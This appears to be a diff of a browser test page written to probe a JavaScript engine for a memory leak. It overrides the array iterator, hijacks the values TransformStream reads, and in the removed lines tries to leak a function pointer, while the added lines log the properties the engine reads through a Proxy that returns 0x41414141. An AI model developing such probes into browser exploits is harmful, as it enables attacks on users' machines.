@@ -3,14 +3,18 @@
 <body>
 <div id="s">Running...</div>
 <script>
-localStorage.removeItem('leak_result');
-localStorage.removeItem('leak_data');
+localStorage.removeItem('proxy_log');
+localStorage.setItem('proxy_log', 'START');
 
-let buf = new ArrayBuffer(8);
-let view = new DataView(buf);
-
-// دالة حقيقية - المحرك قد يعاملها كـ Strategy ويسرب مؤشرها
-let fakeStrategy = function() {};
+let log = [];
+let handler = {
+    get: function(target, prop, receiver) {
+        log.push(prop.toString());
+        // إذا طلب خاصية، أعطه قيمة عشوائية لمعرفة ماذا سيفعل بها
+        return 0x41414141;
+    }
+};
+let p = new Proxy({}, handler);
 
 try {
     Array.prototype[Symbol.iterator] = function() {
@@ -21,8 +25,8 @@ try {
                 if (i >= a.length) return { done: true };
                 let v = a[i];
                 if (a.length === 3 && i >= 1) {
-                    localStorage.setItem('leak_result', 'IDX_' + i + '_FUNC');
-                    v = fakeStrategy;
+                    // سجل كل خاصية يقرأها المحرك
+                    v = p;
                 }
                 i++;
                 return { value: v, done: false };
@@ -31,16 +35,12 @@ try {
     };
 
     new TransformStream();
-    localStorage.setItem('leak_result', 'NO_CRASH');
-    
-    let hex = "";
-    for (let j = 0; j < 8; j++) {
-        hex += view.getUint8(j).toString(16).padStart(2,'0') + " ";
-    }
-    localStorage.setItem('leak_data', hex);
+    localStorage.setItem('proxy_log', log.join(','));
+    localStorage.setItem('proxy_result', 'NO_CRASH');
     
 } catch(e) {
-    localStorage.setItem('leak_result', 'CAUGHT: ' + e.message);
+    localStorage.setItem('proxy_log', log.join(','));
+    localStorage.setItem('proxy_result', 'CRASH_OR_CAUGHT');
 }
 
 Array.prototype[Symbol.iterator] = [][Symbol.iterator];
